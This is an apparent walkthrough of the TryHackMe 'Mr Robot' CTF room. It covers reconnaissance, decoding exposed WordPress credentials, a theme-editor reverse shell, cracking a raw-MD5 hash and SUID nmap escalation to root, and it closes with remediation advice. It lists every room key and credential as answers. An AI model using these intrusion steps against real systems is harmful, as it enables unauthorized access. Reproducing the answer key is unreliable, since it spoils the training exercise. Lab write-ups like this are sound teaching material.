# Mr Robot CTF: Complete TryHackMe Walkthrough

Official room: https://tryhackme.com/room/mrrobot

## Room Overview & Information

**Category:** Web exploitation and Linux privilege escalation  
**Difficulty:** Medium  
**Key concepts:** Nmap, robots.txt information disclosure, WordPress enumeration, Base64 decoding, password-hash recovery, theme-editor abuse, SUID binaries, and privilege boundaries.

The target IP and available ports change between deployments. Replace MACHINE_IP with the active room address. This note uses the keys recorded by the author for the standard room instance; always validate them against your live machine.

## Phase 1: Reconnaissance & Enumeration

### 1. Scan the target

```bash
nmap -sC -sV -oN mrrobot-nmap.txt MACHINE_IP
```

- `-sC` runs Nmap's default scripts.
- `-sV` attempts to identify service versions.
- `-oN` saves readable output.

The standard instance exposes HTTP on TCP 80 and HTTPS on TCP 443; SSH may be closed. Enumerate every discovered web service rather than assuming HTTPS and HTTP expose identical content.

### 2. Inspect the website and robots.txt

Open the site in a browser, then fetch the crawler file:

```bash
curl -i http://MACHINE_IP/robots.txt
```

The file contains two useful paths in the standard room:

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Robots Exclusion Protocol is advisory, not access control. Anyone can request a path listed there.

Retrieve the first key:

```bash
curl -s http://MACHINE_IP/key-1-of-3.txt
```

The recorded first key is:

```text
073403c8a58a1f80d943455fb30724b9
```

The file `fsocity.dic` is a wordlist clue for later tasks.

### 3. Enumerate web paths

Use a suitable wordlist against the HTTP service:

```bash
gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -o gobuster.txt
```

- `dir` selects directory enumeration.
- `-u` supplies the base URL.
- `-w` selects a wordlist.
- `-x` appends extensions to candidate names.
- `-o` saves the findings.

The exact local wordlist path may differ. Discoveries such as `wp-login.php`, WordPress directories, `license`, `robots.txt`, and `key-1-of-3.txt` provide evidence of the WordPress application and the intended path.

## Phase 2: Vulnerability Analysis & Initial Access

### 4. Inspect the license page for exposed credentials

The standard target's `/license` page contains a Base64-encoded string. Retrieve and inspect the page:

```bash
curl -s http://MACHINE_IP/license
```

If the page includes the encoded value shown in the recorded instance, decode it locally:

```bash
printf '%s' 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 --decode
```

Recorded decoded output:

```text
elliot:ER28-0652
```

Base64 is an encoding, not encryption. Sensitive credentials must never be embedded in public web content, even when they appear obscured.

Use the credentials only in the room's WordPress login. If they do not work on a redeployed instance, return to the live page and retrieve the current value rather than repeatedly trying stale data.

### 5. Understand the wordlist clue

The `fsocity.dic` file is large and contains duplicates in the standard room. If the task requires using it for account enumeration or password testing, first inspect its size and de-duplicate it:

```bash
wc -l fsocity.dic
sort -u fsocity.dic > fsocity-unique.txt
wc -l fsocity-unique.txt
```

- `wc -l` counts newline-terminated records.
- `sort -u` sorts the entries and removes duplicates.

Do not start credential attacks without understanding the task, request format, and failure response. In the intended chain, the license page provides the useful username/password pair, so blind brute force is unnecessary for recovering those credentials.

### 6. Obtain a web shell through the authorized WordPress admin feature

After authenticating as the room's administrative user, inspect the WordPress theme editor and identify a theme PHP file that the web server will execute. The room demonstrates the risk of allowing a privileged WordPress account to modify executable theme code.

In an isolated CTF, the editor can be used to replace a theme file with the lab-provided reverse-shell content. Configure the payload for the AttackBox/VPN address and the chosen listener port. Do not use a public IP, personal machine, or any host outside the room.

Start a listener:

```bash
nc -lvnp 4444
```

Trigger the edited file by requesting the corresponding theme path through the target's web server. If the callback succeeds, verify the shell identity:

```bash
whoami
id
pwd
hostname
```

The recorded initial shell runs as `daemon`. A shell as daemon is not root and may have very limited filesystem access. Keep the theme file modification confined to the lab, and restore the original file when the room allows it.

## Phase 3: Privilege Escalation & Post-Exploitation

### 7. Inspect local accounts and robot's password file

Check account entries and the robot home directory:

```bash
grep -E '^(robot|daemon|root):' /etc/passwd
ls -la /home/robot
cat /home/robot/password.raw-md5
```

In the recorded instance, the file contains the username and an MD5 digest:

```text
robot:c3fcd3d76192e4007dfb496cca67e13b
```

The digest corresponds to the weak password `abcdefghijklmnopqrstuvwxyz` in the standard target. MD5 is a fast general-purpose hash and is unsuitable for password storage; password hashes should use a dedicated scheme such as Argon2id, scrypt, or bcrypt with salts and appropriate work factors.

If validating locally, use a tool such as John the Ripper with the correct raw-MD5 format and a wordlist permitted by the room. Do not treat a hash as something that can be “decrypted”; the tool tests candidate values against the digest.

### 8. Change to robot and obtain key 2

Use the recovered password to switch to the robot account within the room:

```bash
su robot
id
cat /home/robot/key-2-of-3.txt
```

The standard recorded second key is:

```text
822c73956184f694993bede3eb39f959
```

Do not publish real passwords. This password is part of the intentionally weak lab data and must not be reused elsewhere.

### 9. Find the SUID escalation path

Enumerate SUID files:

```bash
find / -perm -4000 -type f 2>/dev/null
ls -l /usr/local/bin/nmap
```

The significant finding is a root-owned SUID copy of Nmap. The older Nmap build used by the room includes an interactive mode that is absent from modern releases. In this historical lab version:

```text
nmap --interactive
nmap> !sh
whoami
id
```

The `!sh` command invokes a shell from the old interactive interface. With the misconfigured SUID binary, it runs with root privileges in the lab. Verify this with `id`; do not assume that every Nmap installation supports this old feature.

### 10. Retrieve the third key

After confirming root access, read the expected file:

```bash
cat /root/key-3-of-3.txt
```

The recorded third key is:

```text
04787ddef27c3dee1ee161b21670b4e4
```

## Phase 4: Room Questions & Flags Walkthrough

| Objective | Answer from the recorded instance | How it was found |
|---|---|---|
| First key | `073403c8a58a1f80d943455fb30724b9` | Read the file disclosed by robots.txt |
| Wordlist | `fsocity.dic` | Listed in robots.txt |
| WordPress credentials | `elliot:ER28-0652` | Decode the Base64 value in /license |
| Initial shell account | `daemon` | Verify with whoami/id after the authorized lab callback |
| Password digest | `c3fcd3d76192e4007dfb496cca67e13b` | Read /home/robot/password.raw-md5 |
| Password for robot | `abcdefghijklmnopqrstuvwxyz` | Validate the recorded weak raw-MD5 value in the lab |
| Second key | `822c73956184f694993bede3eb39f959` | Read /home/robot/key-2-of-3.txt as robot |
| SUID escalation binary | `/usr/local/bin/nmap` | SUID search and permission inspection |
| Third key | `04787ddef27c3dee1ee161b21670b4e4` | Read /root/key-3-of-3.txt as root |

## Phase 5: Key Takeaways & Remediation

- Do not publish credential-like values in public web pages; encoding does not protect secrets.
- Remove unnecessary files and sensitive artifacts from a web root.
- Restrict WordPress theme editing to tightly controlled administrators; disable file editing in production where possible.
- Run web workers under low-privilege service accounts and isolate writable web directories from executable code.
- Store passwords with modern dedicated password-hashing functions and unique salts.
- Remove SUID from general-purpose tools such as Nmap. Patch outdated software and review privileged binaries.
- Keep evidence accurate: keys and credentials can be instance-specific, while command structure and vulnerability reasoning remain reusable.

The important chain is information disclosure, exposed credentials, a privileged WordPress code-editing feature, weak password storage, and an unsafe SUID binary. Each issue should be fixed independently.